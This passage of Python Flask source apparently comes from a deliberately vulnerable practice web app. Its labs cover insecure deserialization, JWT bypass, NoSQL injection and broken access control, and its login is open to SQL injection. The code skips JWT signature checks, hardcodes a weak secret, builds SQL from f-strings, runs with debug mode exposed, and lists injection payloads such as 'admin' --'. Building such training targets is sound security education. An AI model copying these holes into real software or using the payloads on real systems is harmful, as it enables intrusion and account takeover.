            <div class="card-header">
                <i class="bi bi-arrow-repeat"></i> Insecure Deserialization Lab
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <strong>Goal:</strong> Achieve RCE through deserialization.
                    <br>Modify the serialized object to change your role to 'admin'
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Username:</label>
                        <input type="text" name="name" class="form-control" value="Guest">
                    </div>
                    <button type="submit" name="serialize" class="btn btn-primary">Serialize Object</button>
                </form>
                
                {f'''
                <div class="mt-3">
                    <h5>Serialized Data:</h5>
                    <pre class="terminal">{user_data}</pre>
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Modify and Deserialize:</label>
                        <textarea name="data" class="form-control">{user_data}</textarea>
                    </div>
                    <button type="submit" name="deserialize" class="btn btn-warning">Deserialize</button>
                </form>
                ''' if user_data else ''}
                
                {f'<div class="mt-3 alert alert-info">{result}</div>' if result else ''}
                
                <h5 class="mt-4">Deserialization Attack Vectors:</h5>
                <ul>
                    <li>Modify role attribute to 'admin'</li>
                    <li>Inject malicious __reduce__ method</li>
                    <li>Use gadget chains for RCE</li>
                </ul>
            </div>
        </div>
    """
    return render_page(content)

# 10. JWT Attacks
@app.route("/jwt")
def jwt():
    token = request.cookies.get('auth', '')
    user_data = {}
    
    if token:
        try:
            # Vulnerable: No signature verification
            import json
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = base64.b64decode(parts[1] + '==').decode()
                user_data = json.loads(payload)
        except:
            pass
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-key"></i> JWT Attacks Lab
            </div>
            <div class="card-body">
                <div class="alert alert-warning">
                    <strong>Goal:</strong> Bypass JWT verification to become admin.
                    <br>Try: None algorithm attack, weak secret cracking
                </div>
                
                <div class="card mb-3">
                    <div class="card-header">Current Token</div>
                    <div class="card-body">
                        <pre class="terminal">{token or 'No token'}</pre>
                        
                        {f'<h6>Decoded:</h6><pre>{user_data}</pre>' if user_data else ''}
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">Generate Token</div>
                            <div class="card-body">
                                <form action="/jwt/generate" method="POST">
                                    <div class="mb-3">
                                        <label>Username:</label>
                                        <input type="text" name="username" class="form-control" value="user">
                                    </div>
                                    <div class="mb-3">
                                        <label>Role:</label>
                                        <input type="text" name="role" class="form-control" value="user">
                                    </div>
                                    <button type="submit" class="btn btn-primary">Generate JWT</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">Verify Token</div>
                            <div class="card-body">
                                <form action="/jwt/verify" method="POST">
                                    <div class="mb-3">
                                        <label>JWT Token:</label>
                                        <textarea name="token" class="form-control" rows="3"></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-warning">Verify</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
                
                <h5 class="mt-4">JWT Attack Techniques:</h5>
                <ul>
                    <li>None algorithm: Change alg to "none"</li>
                    <li>Algorithm confusion (RS256 → HS256)</li>
                    <li>Brute force weak secrets</li>
                    <li>Kid parameter injection</li>
                </ul>
            </div>
        </div>
    """
    return render_page(content)

@app.route("/jwt/generate", methods=['POST'])
def generate_jwt():
    import jwt
    username = request.form.get('username', 'user')
    role = request.form.get('role', 'user')
    
    token = jwt.encode(
        {'username': username, 'role': role},
        'secret123',  # Weak secret
        algorithm='HS256'
    )
    
    resp = make_response(redirect(url_for('jwt')))
    resp.set_cookie('auth', token)
    return resp

@app.route("/jwt/verify", methods=['POST'])
def verify_jwt():
    import jwt
    token = request.form.get('token', '')
    
    try:
        # Vulnerable: Accepts none algorithm
        payload = jwt.decode(token, options={"verify_signature": False})
        return f"Valid token! Payload: {payload}"
    except:
        return "Invalid token"

# 11. NoSQL Injection
@app.route("/nosql", methods=['GET', 'POST'])
def nosql():
    result = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Simulate NoSQL database
        users = {
            'admin': 'admin123',
            'user': 'userpass',
            'guest': 'guest123'
        }
        
        # Vulnerable NoSQL-like query
        query = f"db.users.find({{username: '{username}', password: '{password}'}})"
        
        # Check login (simulated NoSQL injection)
        if "'" in username or "'" in password:
            result = f"Query: {query}\n\nResult: ALL USERS RETURNED (NoSQL Injection Success!)"
        elif username in users and users[username] == password:
            result = f"Query: {query}\n\nResult: Login successful! Welcome {username}"
        else:
            result = f"Query: {query}\n\nResult: Login failed"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-database-fill"></i> NoSQL Injection Lab
            </div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>Goal:</strong> Bypass login using NoSQL injection.
                    <br>Try: <code>' || '1'=='1</code> or <code>{{'$ne': ''}}</code>
                </div>
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Username:</label>
                        <input type="text" name="username" class="form-control" placeholder="admin' || '1'=='1">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Password:</label>
                        <input type="text" name="password" class="form-control" placeholder="anything">
                    </div>
                    <button type="submit" class="btn btn-primary">Login</button>
                </form>
                
                {f'''
                <div class="mt-4">
                    <h5>Result:</h5>
                    <pre class="terminal">{result}</pre>
                </div>
                ''' if result else ''}
                
                <h5 class="mt-4">NoSQL Injection Payloads:</h5>
                <table class="table table-dark table-striped">
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Payload</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr><td>Authentication Bypass</td><td>{{"username": {{"$ne": null}}, "password": {{"$ne": null}}}}</td></tr>
                        <tr><td>SQL-style</td><td>admin' || '1'=='1</td></tr>
                        <tr><td>PHP-style</td><td>admin' && '1'=='1</td></tr>
                        <tr><td>JavaScript</td><td>{{'$where': 'this.password == "admin"'}}</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
    """
    return render_page(content)

# Hidden admin panel
@app.route("/admin-panel")
def admin_panel():
    content = """
        <div class="card">
            <div class="card-header bg-danger text-white">
                <i class="bi bi-exclamation-triangle"></i> Admin Panel (Hidden)
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <strong>⚠️ This page should be protected but is accessible!</strong>
                    <br>This is an example of broken access control.
                </div>
                
                <div class="row">
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">Database Admin</div>
                            <div class="card-body">
                                <button class="btn btn-danger" onclick="alert('Database would be wiped in real scenario!')">
                                    <i class="bi bi-database-dash"></i> Wipe Database
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">User Management</div>
                            <div class="card-body">
                                <ul class="list-unstyled">
                                    <li>admin (admin)</li>
                                    <li>user (user)</li>
                                    <li>guest (guest)</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="mt-3">
                    <h5>Sensitive Information:</h5>
                    <pre class="terminal">
DATABASE_URL = "postgresql://admin:SuperSecretPassword123@localhost:5432/prod"
AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
API_KEY = "sk-1234567890abcdef1234567890abcdef"
                    </pre>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# Login page (vulnerable)
@app.route("/login", methods=['GET', 'POST'])
def login():
    message = ""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # Vulnerable: MD5 hash without salt
        password_hash = hashlib.md5(password.encode()).hexdigest()
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        # Vulnerable to SQL injection
        c.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password_hash}'")
        user = c.fetchone()
        conn.close()
        
        if user:
            session['user'] = username
            message = f"Login successful! Welcome {username}"
        else:
            message = "Login failed"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-box-arrow-in-right"></i> Login
            </div>
            <div class="card-body">
                {f'<div class="alert alert-info">{message}</div>' if message else ''}
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Username:</label>
                        <input type="text" name="username" class="form-control" placeholder="admin' --">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Password:</label>
                        <input type="password" name="password" class="form-control" placeholder="anything">
                    </div>
                    <button type="submit" class="btn btn-primary">Login</button>
                </form>
                
                <div class="mt-3">
                    <p>Hint: Try SQL injection: <code>admin' --</code></p>
                </div>
            </div>
        </div>
    """
    return render_page(content)

# Password reset (vulnerable)
@app.route("/reset-password", methods=['GET', 'POST'])
def reset_password():
    message = ""
    if request.method == 'POST':
        username = request.form.get('username', '')
        # Insecure: No token validation
        message = f"Password reset link sent to {username}@example.com (insecure implementation)"
    
    content = f"""
        <div class="card">
            <div class="card-header">
                <i class="bi bi-key"></i> Password Reset
            </div>
            <div class="card-body">
                <div class="alert alert-warning">
                    <strong>Insecure:</strong> No token validation, user enumeration possible.
                </div>
                
                {f'<div class="alert alert-info">{message}</div>' if message else ''}
                
                <form method="POST">
                    <div class="mb-3">
                        <label class="form-label">Username:</label>
                        <input type="text" name="username" class="form-control" placeholder="Enter username">
                    </div>
                    <button type="submit" class="btn btn-warning">Reset Password</button>
                </form>
            </div>
        </div>
    """
    return render_page(content)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗      █████╗ ██████╗ ║
    ║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║     ██╔══██╗██╔══██╗║
    ║   ███████║███████║██║     █████╔╝ ██║     ███████║██████╔╝║
    ║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║     ██╔══██║██╔══██╗║
    ║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██████╔╝║
    ║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ║
    ║                                                           ║
    ║           Vulnerable Web App for Hacking Practice         ║
    ║                                                           ║
    ╠═══════════════════════════════════════════════════════════╣
    ║                                                           ║
    ║   🚀 Server starting...                                    ║
    ║   📍 URL: http://localhost:5001                           ║
    ║   ⚠️ WARNING: This app contains intentional vulnerabilities ║
    ║   🔒 For educational purposes only                        ║
    ║                                                           ║
    ║   Vulnerabilities included:                               ║
    ║   ✓ SQL Injection                                         ║
    ║   ✓ Cross-Site Scripting (XSS)                            ║
    ║   ✓ File Upload Bypass                                    ║
    ║   ✓ Local File Inclusion (LFI)                            ║
    ║   ✓ Command Injection                                     ║
    ║   ✓ Insecure Direct Object References (IDOR)              ║
    ║   ✓ Cross-Site Request Forgery (CSRF)                     ║
    ║   ✓ Server-Side Request Forgery (SSRF)                    ║
    ║   ✓ XML External Entity (XXE)                             ║
    ║   ✓ Insecure Deserialization                              ║
    ║   ✓ JWT Attacks                                           ║
    ║   ✓ NoSQL Injection                                       ║
    ║   ✓ Broken Authentication                                 ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=5001, debug=True)
